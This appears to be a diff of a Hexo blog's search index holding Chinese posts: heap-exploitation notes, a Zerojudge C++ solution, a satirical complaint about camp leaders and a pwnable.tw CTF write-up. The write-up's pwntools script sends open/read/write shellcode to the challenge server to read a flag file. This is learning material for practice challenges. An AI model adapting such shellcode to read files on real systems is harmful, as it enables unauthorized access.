@@ -1,6 +1,82 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Heap_Exploitation</title>
+    <url>/2024/11/27/Heap-Exploitation/</url>
+    <content><![CDATA[<h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/heap_exploitation/heap.png"
+                      alt="ELF sections"
+                ><br>heap 是從<code>低位</code>往<code>高位</code>長<br>然後主要會用到:</p>
+<ul>
+<li>malloc(size) 拿記憶體</li>
+<li>free(ptr) 釋放記憶體</li>
+</ul>
+<p>malloc 後拿到的 ptr 會指著 user_data 的地方 可以直接開始寫入<br>但實際上 ptr-0x10 有存一些這個 chunk 的資訊</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/heap_exploitation/free_heap.png"
+                      alt="Freed_Heap"
+                ></p>
+<p>free 掉之後會依照大小被分到不同的 bin</p>
+<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><ul>
+<li>size &lt; 0x90 會被分到這</li>
+<li>裡面還有依大小分: 0x20, 0x30, 0x40 … 0x80</li>
+<li>LIFO</li>
+<li>不會把 free 掉的 chunk P flag 設成 0</li>
+</ul>
+<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>在 free 掉之後 chunk 會被寫入</p>
+<ul>
+<li>fd</li>
+<li>bk</li>
+</ul>
+<p>如果是 unsorted bin 還會有</p>
+<ul>
+<li>fd_nextsize</li>
+<li>bk_nextsize</li>
+</ul>
+<h3 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h3><p>第一次執行 malloc 會呼叫 sys_brk 或 sys_mmap<br>來拿記憶體 也就是 <code>main arena</code></p>
+<blockquote>
+<p>heap 有 ASLR 所以有時候會要 leak heap base<br>malloc 拿到的記憶體塊就是 chunk</p>
+</blockquote>
+<ul>
+<li>Allocated Chunk</li>
+<li>Free Chunk</li>
+<li>Top Chunk</li>
+</ul>
+<h3 id="Size-Alignment"><a href="#Size-Alignment" class="headerlink" title="Size Alignment"></a>Size Alignment</h3><p>chunk 的大小會對齊 0x10<br>如果 malloc 0x18 會拿到 0x20 的大小</p>
+<h2 id="Common-Exploit"><a href="#Common-Exploit" class="headerlink" title="Common Exploit"></a>Common Exploit</h2><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><h3 id="Heap-Hooks"><a href="#Heap-Hooks" class="headerlink" title="Heap Hooks"></a>Heap Hooks</h3><h2 id="Heap-Exploitation"><a href="#Heap-Exploitation" class="headerlink" title="Heap Exploitation"></a>Heap Exploitation</h2><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><h2 id="and-more"><a href="#and-more" class="headerlink" title="and more"></a>and more</h2>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Heap</tag>
+        <tag>CTF</tag>
+        <tag>note</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwnable.tw orw writeup</title>
+    <url>/2024/11/10/Pwnable-tw-orw-writeup/</url>
+    <content><![CDATA[<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><h3 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
+<p>Read the flag from &#x2F;home&#x2F;orw&#x2F;flag.<br>Only open read write syscall are allowed to use.</p>
+</blockquote>
+<p><a class="link"   href="https://pwnable.tw/challenge/#2" >pwnable.tw_orw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h2><p>總之就是你丟什麼他就執行什麼<br>但是只能用 <strong>read&#x2F;write&#x2F;open</strong></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 shellcraft 生成 shellcode</span></span><br><span class="line"><span class="comment"># 讀取並輸出 50 個 byte</span></span><br><span class="line">sc = asm(</span><br><span class="line">    shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">b&#x27;/home/orw/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>) +</span><br><span class="line">    shellcraft.i386.linux.write(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WriteUp</tag>
+        <tag>Pwnable.tw</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CLASSIFIED_001</title>
     <url>/2024/08/18/CLASSIFIED/</url>
     <content><![CDATA[
@@ -38,86 +114,6 @@
         <tag>C++</tag>
         <tag>題解</tag>
         <tag>APCS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pwnable.tw orw writeup</title>
-    <url>/2024/11/10/Pwnable-tw-orw-writeup/</url>
-    <content><![CDATA[<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><h3 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h3><blockquote>
-<p>Read the flag from &#x2F;home&#x2F;orw&#x2F;flag.<br>Only open read write syscall are allowed to use.</p>
-</blockquote>
-<p><a class="link"   href="https://pwnable.tw/challenge/#2" >pwnable.tw_orw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="題解"><a href="#題解" class="headerlink" title="題解"></a>題解</h2><p>總之就是你丟什麼他就執行什麼<br>但是只能用 <strong>read&#x2F;write&#x2F;open</strong></p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 shellcraft 生成 shellcode</span></span><br><span class="line"><span class="comment"># 讀取並輸出 50 個 byte</span></span><br><span class="line">sc = asm(</span><br><span class="line">    shellcraft.i386.linux.<span class="built_in">open</span>(<span class="string">b&#x27;/home/orw/flag&#x27;</span>) +</span><br><span class="line">    shellcraft.i386.linux.read(<span class="string">&#x27;eax&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>) +</span><br><span class="line">    shellcraft.i386.linux.write(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;esp&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, sc)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>WriteUp</tag>
-        <tag>Pwnable.tw</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>高中隔宿領隊教官新手指南</title>
-    <url>/2024/09/15/HowToBeDuuuumb/</url>
-    <content><![CDATA[<p>由 <em>格里西亞</em> 編寫，如有廠商想放入員工手冊作為員工教育的教材，請私下聯繫我</p>
-<p>聲明：</p>
-<ul>
-<li>所有人名與劇情純屬虛構，皆無影射現實，如有相似純屬巧合</li>
-<li>若發現奇怪的名字，一定是我打錯，純屬巧合</li>
-<li>格里西亞不是蛤蜊蝦</li>
-</ul>
-<h2 id="如何讓學生聽話"><a href="#如何讓學生聽話" class="headerlink" title="如何讓學生聽話"></a>如何讓學生聽話</h2><h3 id="軍事化管理"><a href="#軍事化管理" class="headerlink" title="軍事化管理"></a>軍事化管理</h3><p>學生平常在家都過的爽爽的，對我們這些崇高的大人們十分沒有禮貌，所以我們應該利用 <strong>軍事化的管理</strong> 加強對學生的控制。</p>
-<p>具體事項包含：</p>
-<ul>
-<li>強烈要求學生服從每個指令</li>
-<li>扮演教官身著軍裝</li>
-<li>要求學生背誦軍歌並大聲唱出來</li>
-<li>活用勞動擊潰學生身體，如：不斷起立蹲下、要求學生在營地奔跑、強烈要求學生在晚會不斷跳躍與揮手</li>
-<li>活用不適感擊潰學生心理，如：要求學生在地上端坐兩個小時、晚上只以清水洗澡並且不得洗頭、在學生疲憊時仍強烈要求從事高體力消耗活動</li>
-</ul>
-<hr>
-<h3 id="糖與鞭子"><a href="#糖與鞭子" class="headerlink" title="糖與鞭子"></a>糖與鞭子</h3><p>在前面高度施壓下，學生將會越來越疲倦，並且開始拒絕服從命令，所以我們應該在高度施壓的情況下，同時給予一些甜頭，並說服學生服從。</p>
-<p>具體事項包含：</p>
-<ul>
-<li>給予<strong>友好的第一印象以及最後印象</strong>，可以在來回的遊覽車上跟學生打好關係，讓他們認為我們是好朋友，這次的旅行將會很愉快。並且在出發時給予一些正面的關鍵字，例如：成長、英雄、體驗、同樂</li>
-<li><strong>理直氣壯的給予獎勵</strong>，即使獎勵本身沒有任何意義，舉例：<em>讓聽話的中隊先洗澡，即使本來就安排他們先，也要表現的好像這是在獎勵他們的聽話</em>、<em>發放運動飲料給學生，並說這是看在你們優良表現的份上，即使飲料發放早就是事先預定好的</em>、<em>將毫無意義的分數與金幣描述的非常重要(也可以完全不做描述，讓他們完全不知道它的功能，只知道領隊一直告訴他們要去追求分數，畢竟現在的學生只要聽到分數就會自己開始擔心了)，讓學生為了追求分數而絕對服從長官指示</em></li>
-<li>在從事強烈體力與精神消耗的前後，對學生施以<strong>道德綁架</strong>，讓其不得不服從，如：<em>這都是為了我們這個團體，你不認真就會成為眾矢之的，害所有人的努力白費</em>、<em>我們是一個團隊，你們任何一個人都會影響到最終成敗</em>、<em>要是因為一個人導致我們輸了，你們難道不感覺可恥嗎</em></li>
-</ul>
-<p>*註1：所有獎勵發放時都需要表明，這不是學生們應得的，而是我們看在他們努力的份上，勉為其難的施捨。</p>
-<p>*註2：在實施 <strong>道德綁架</strong> 以及 <strong>獎勵發放</strong> 時都要表明身為領隊的苦楚，讓學生認為領隊與他們站在同一陣線，例如：我真的很想幫大家贏得勝利，我們大家是一夥的，我們要努力拼過其他中隊，大家趕快去搶分數</p>
-<p>*註3：好好的運用 <strong>道德綁架</strong> 能有效的讓學生自行產生擔心自己拖累同伴的心理，基於害怕他們便會乖乖的聽從指揮</p>
-<h2 id="如何讓學生認為這次隔宿是有趣的"><a href="#如何讓學生認為這次隔宿是有趣的" class="headerlink" title="如何讓學生認為這次隔宿是有趣的"></a>如何讓學生認為這次隔宿是有趣的</h2><h3 id="運用上面的學生管理技巧"><a href="#運用上面的學生管理技巧" class="headerlink" title="運用上面的學生管理技巧"></a>運用上面的學生管理技巧</h3><p>最重要的就是讓學生認為領隊跟他們是站在同一陣線，並且真心為他們著想的。再來就是不定時給予一些獎勵，讓學生對領隊心懷感激。</p>
-<hr>
-<h3 id="學生對領隊的印象很重要"><a href="#學生對領隊的印象很重要" class="headerlink" title="學生對領隊的印象很重要"></a>學生對領隊的印象很重要</h3><p>第一印象一定要好，這樣之後嚴格管理學生時，他們才不會覺得我們是壞人，而是更傾向於相信我們。</p>
-<p>最後印象也一定要好，快要離開營區就不要再罵學生了，讓他們盡情的玩樂。最後在遊覽車上可以花時間來為學生回顧這兩天發生的事，畢竟就算再怎麼辛苦，學生們這兩天總有一個時候是快樂的，雖然這很有可能是因為跟同學的互動，但藉由回顧行程，會讓學生認為自己撐過去了，並把學生對同學間有趣的小事所產生的快樂 誤認為是整個行程所帶來的快樂。最後要確保回程的路上車內氣氛是愉快的，這樣那些傻孩子就會認為整個行程是愉快的。</p>
-<p>至於在營區的這段時間，就是嚴加控管，怎麼罵學生都可以，但要注意不定時依照上述原則施以小惠，讓學生不會到憎恨領隊的地步</p>
-<h2 id="如何確保學生安全"><a href="#如何確保學生安全" class="headerlink" title="如何確保學生安全"></a>如何確保學生安全</h2><p>怎麼會有這標題，這很重要嗎？<br>他們會自己照顧自己<br>跳過</p>
-<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q:我是主張愛的教育的領隊，請問一定要用兇的嗎？</p>
-<p><del>A:不用兇學生我們要去哪裡釋放壓力，你有病吧</del></p>
-<p>A:我們也是主張愛的教育，但學生們平時安逸慣了，總得給他們好好上一課，所以我們不得不接手這個重責大任。</p>
-<hr>
-<p>Q:我們領隊過的太開心會不會讓學生不爽啊？</p>
-<p><del>A:實例：蛤蜊蝦同學在第二天起床氣爆炸後，看到小白癡領隊一臉悠哉，瀏海上還有髮捲的時候差點失控打人，所以當然會啊</del></p>
-<p>A:可以放心喔，學生們就是要來鍛鍊耐力的，相信他們可以體諒我們領隊的辛苦。</p>
-<hr>
-<p>Q:我在營隊對同學這麼兇，他們會不會很討厭我啊？</p>
-<p><del>A:實例：蛤蜊蝦同學正在寫新手領隊指南，同時嘗試 OSINT 領隊讓他們失業</del></p>
-<p>A:我們的同仁都用了最大的努力在照顧同學了，我們這麼辛苦，他們要是還討厭我們那是他們的損失，我們領隊超棒的！</p>
-<hr>
-<p>Q:可以請蛤蜊蝦同學分享一下感想嗎？</p>
-<p><del>A:蛤蜊蝦：各位同學，仔細想想這趟旅程，園區的體驗本身大多都很無趣，晚上的住宿與盥洗十分可悲。雖然不能否認我有幾個瞬間是開心的，但那都是因為有同學的陪伴，而不是因為學校或旅行社的安排。我認為如果是一模一樣的行程，我們自己揪團肯定會更開心百倍。雖然這讓我感到厭惡，但領隊在一件事上是對的「比起畢旅或其他活動成長營絕對會讓你們印象深刻」，我的確印象深刻，我記得我在領隊命令下的那種不情願；我記得我在領隊辱罵聲中感到的憤怒；我記得那火辣的太陽、堅硬的地板、悶熱的帳逢、強迫你開心的晚會、不斷轉換黑臉白臉的教官。我記得而且將<strong>永遠</strong>記得。</del></p>
-<p>A:不好意思，我們不知道你在說哪位。</p>
-]]></content>
-      <categories>
-        <category>日常生活</category>
-      </categories>
-      <tags>
-        <tag>日常</tag>
-        <tag>高中生活</tag>
-        <tag>抱怨文</tag>
       </tags>
   </entry>
   <entry>
@@ -293,10 +289,41 @@ erase(n)
         <category>程式筆記</category>
       </categories>
       <tags>
+        <tag>note</tag>
         <tag>C++</tag>
         <tag>APCS</tag>
-        <tag>筆記</tag>
         <tag>資料結構</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Zerojudge k572 題解</title>
+    <url>/2024/10/05/k572/</url>
+    <content><![CDATA[<p>離散化這個字光是聽起來就超帥</p>
+<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p>第一行輸入 N 筆資料<br>每筆資料有一個區間 [L,R]<br>求出重疊最多的數字，若相同則輸出最大者<br><a class="link"   href="https://zerojudge.tw/ShowProblem?problemid=k572" >Zerojudge題目連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="測資"><a href="#測資" class="headerlink" title="測資"></a>測資</h2><p>Example 1:</p>
+<blockquote>
+<p>Input:<br>3<br>19 25<br>23 26<br>18 20<br>Output:<br>25</p>
+</blockquote>
+<p>Example 2:</p>
+<blockquote>
+<p>Input:<br>2<br>-1000000000 999999995<br>-999999995 1000000000<br>Output:<br>999999995</p>
+</blockquote>
+<h2 id="解題關鍵"><a href="#解題關鍵" class="headerlink" title="解題關鍵"></a>解題關鍵</h2><p>整個程式最重要的邏輯就是:<br>最優解一定會出現在剛剛輸入的一堆範圍中 某個範圍的邊界值<br>因為對於兩個重疊的範圍，</p>
+<p>如:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-XXXXX---</span><br><span class="line">---OOOOO-</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure></div>
+
+<p>若有一個重疊且非邊界，如:5<br>則必存在一個重疊且邊界，如:6，則6為最佳解</p>
+<p>這時候就可以利用 map 非連續的特性<br>只對邊界進行處裡，而非整個範圍</p>
+<h2 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">這個程式用差分數列去計算 map</span></span><br><span class="line"><span class="comment">個人覺得超級巧妙</span></span><br><span class="line"><span class="comment">因為 map 本身會用 key 值排序</span></span><br><span class="line"><span class="comment">這樣在做前綴和時</span></span><br><span class="line"><span class="comment">就自然會包含剛剛輸入的所有座標</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC optimize(<span class="string">&quot;Ofast,fast-math,unroll-loops,no-stack-protector&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIO ios_base::sync_with_stdio(false), cin.tie(0), cout.tie(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> endl <span class="string">&quot;\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SIO;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        mp[l]++;</span><br><span class="line">        <span class="keyword">if</span>(!mp[r]) mp[r]; <span class="comment">// 注意這行</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        因為如果只是照一般差分數列，不寫這行的話</span></span><br><span class="line"><span class="comment">        就會處理不到 r 的位置</span></span><br><span class="line"><span class="comment">        所以 mp[r] 必須有一個值</span></span><br><span class="line"><span class="comment">        設定為 0 的話也不會影響到差分數列</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        mp[r<span class="number">+1</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    這邊不先計算前綴和</span></span><br><span class="line"><span class="comment">    而是直接用 tmp 這個變數去加，可以簡化程式</span></span><br><span class="line"><span class="comment">    所以 tmp 就會是與運行到 mp[i] 的前綴和相等</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>; <span class="comment">// 相當於算完前綴和後的 mp[i].second</span></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>; <span class="comment">// 最優解的值</span></span><br><span class="line">    <span class="type">int</span> ind = <span class="number">-1</span>; <span class="comment">// 最優解的座標</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;i:mp)&#123;</span><br><span class="line">        tmp += i.second;</span><br><span class="line">        <span class="keyword">if</span>(tmp &gt; ans)&#123;</span><br><span class="line">            ans = tmp;</span><br><span class="line">            ind = i.first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tmp == ans)&#123;</span><br><span class="line">            ind = <span class="built_in">max</span>(ind, i.first); <span class="comment">// 座標優先取大者</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ind;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>程式題解</category>
+      </categories>
+      <tags>
+        <tag>note</tag>
+        <tag>C++</tag>
+        <tag>題解</tag>
+        <tag>離散化</tag>
       </tags>
   </entry>
   <entry>
@@ -347,65 +374,9 @@ erase(n)
       </categories>
       <tags>
         <tag>CTF</tag>
-        <tag>筆記</tag>
+        <tag>note</tag>
         <tag>pwn</tag>
         <tag>ROP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Zerojudge k572 題解</title>
-    <url>/2024/10/05/k572/</url>
-    <content><![CDATA[<p>離散化這個字光是聽起來就超帥</p>
-<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p>第一行輸入 N 筆資料<br>每筆資料有一個區間 [L,R]<br>求出重疊最多的數字，若相同則輸出最大者<br><a class="link"   href="https://zerojudge.tw/ShowProblem?problemid=k572" >Zerojudge題目連結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="測資"><a href="#測資" class="headerlink" title="測資"></a>測資</h2><p>Example 1:</p>
-<blockquote>
-<p>Input:<br>3<br>19 25<br>23 26<br>18 20<br>Output:<br>25</p>
-</blockquote>
-<p>Example 2:</p>
-<blockquote>
-<p>Input:<br>2<br>-1000000000 999999995<br>-999999995 1000000000<br>Output:<br>999999995</p>
-</blockquote>
-<h2 id="解題關鍵"><a href="#解題關鍵" class="headerlink" title="解題關鍵"></a>解題關鍵</h2><p>整個程式最重要的邏輯就是:<br>最優解一定會出現在剛剛輸入的一堆範圍中 某個範圍的邊界值<br>因為對於兩個重疊的範圍，</p>
-<p>如:</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-XXXXX---</span><br><span class="line">---OOOOO-</span><br><span class="line">123456789</span><br></pre></td></tr></table></figure></div>
-
-<p>若有一個重疊且非邊界，如:5<br>則必存在一個重疊且邊界，如:6，則6為最佳解</p>
-<p>這時候就可以利用 map 非連續的特性<br>只對邊界進行處裡，而非整個範圍</p>
-<h2 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">這個程式用差分數列去計算 map</span></span><br><span class="line"><span class="comment">個人覺得超級巧妙</span></span><br><span class="line"><span class="comment">因為 map 本身會用 key 值排序</span></span><br><span class="line"><span class="comment">這樣在做前綴和時</span></span><br><span class="line"><span class="comment">就自然會包含剛剛輸入的所有座標</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> GCC optimize(<span class="string">&quot;Ofast,fast-math,unroll-loops,no-stack-protector&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIO ios_base::sync_with_stdio(false), cin.tie(0), cout.tie(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> endl <span class="string">&quot;\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SIO;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">        mp[l]++;</span><br><span class="line">        <span class="keyword">if</span>(!mp[r]) mp[r]; <span class="comment">// 注意這行</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        因為如果只是照一般差分數列，不寫這行的話</span></span><br><span class="line"><span class="comment">        就會處理不到 r 的位置</span></span><br><span class="line"><span class="comment">        所以 mp[r] 必須有一個值</span></span><br><span class="line"><span class="comment">        設定為 0 的話也不會影響到差分數列</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        mp[r<span class="number">+1</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    這邊不先計算前綴和</span></span><br><span class="line"><span class="comment">    而是直接用 tmp 這個變數去加，可以簡化程式</span></span><br><span class="line"><span class="comment">    所以 tmp 就會是與運行到 mp[i] 的前綴和相等</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0</span>; <span class="comment">// 相當於算完前綴和後的 mp[i].second</span></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>; <span class="comment">// 最優解的值</span></span><br><span class="line">    <span class="type">int</span> ind = <span class="number">-1</span>; <span class="comment">// 最優解的座標</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;i:mp)&#123;</span><br><span class="line">        tmp += i.second;</span><br><span class="line">        <span class="keyword">if</span>(tmp &gt; ans)&#123;</span><br><span class="line">            ans = tmp;</span><br><span class="line">            ind = i.first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tmp == ans)&#123;</span><br><span class="line">            ind = <span class="built_in">max</span>(ind, i.first); <span class="comment">// 座標優先取大者</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; ind;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>程式題解</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
-        <tag>題解</tag>
-        <tag>筆記</tag>
-        <tag>離散化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>用hexo創建部落格</title>
-    <url>/2024/08/21/build-a-blog-with-hexo/</url>
-    <content><![CDATA[<h2 id="第一步-下載-node-js"><a href="#第一步-下載-node-js" class="headerlink" title="第一步:下載 node.js"></a>第一步:下載 node.js</h2><p>可以到 <a class="link"   href="https://nodejs.org/" >node.js <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 下載最新的版本<br>下一步 下一步 下一步 安裝成功</p>
-<h2 id="第二步-github-設定"><a href="#第二步-github-設定" class="headerlink" title="第二步: github 設定"></a>第二步: github 設定</h2><p>因為我是用 github pages<br>所以會需要用到 github 來公開網站<br>然後最好下載 git 這樣可以用 git bash 比較不會出錯</p>
-<h3 id="在-github-創建一個新的-repository"><a href="#在-github-創建一個新的-repository" class="headerlink" title="在 github 創建一個新的 repository"></a>在 github 創建一個新的 repository</h3><p>名字取作 你的帳號.github.io 例如:(grissia.github.io)<br>然後其他都留預設就可以了(尤其是 repo 要設公開)</p>
-<h2 id="第三步-安裝-hexo"><a href="#第三步-安裝-hexo" class="headerlink" title="第三步:安裝 hexo"></a>第三步:安裝 hexo</h2><p>可以到 <a class="link"   href="https://hexo.io/" >Hexo的官網 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>或用我底下附的指令<br><strong>這些指令在git bash執行才不會出錯</strong></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">// 安裝hexo</span><br><span class="line">npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">// 創建一個叫做blog的網頁專案</span><br><span class="line">hexo init blog</span><br><span class="line"></span><br><span class="line">// 進入剛創的資料夾</span><br><span class="line"><span class="built_in">cd</span> blog</span><br><span class="line"></span><br><span class="line">// 加載 npm</span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line">// 在本地運行(目前不需要)</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="第四步-挑選主題"><a href="#第四步-挑選主題" class="headerlink" title="第四步:挑選主題"></a>第四步:挑選主題</h2><p>到剛剛的 hexo 官網選擇喜歡的主題，然後根據該主題的說明一步步安裝即可<br><strong>記得改 _config.yml 裡面的 theme 選項</strong></p>
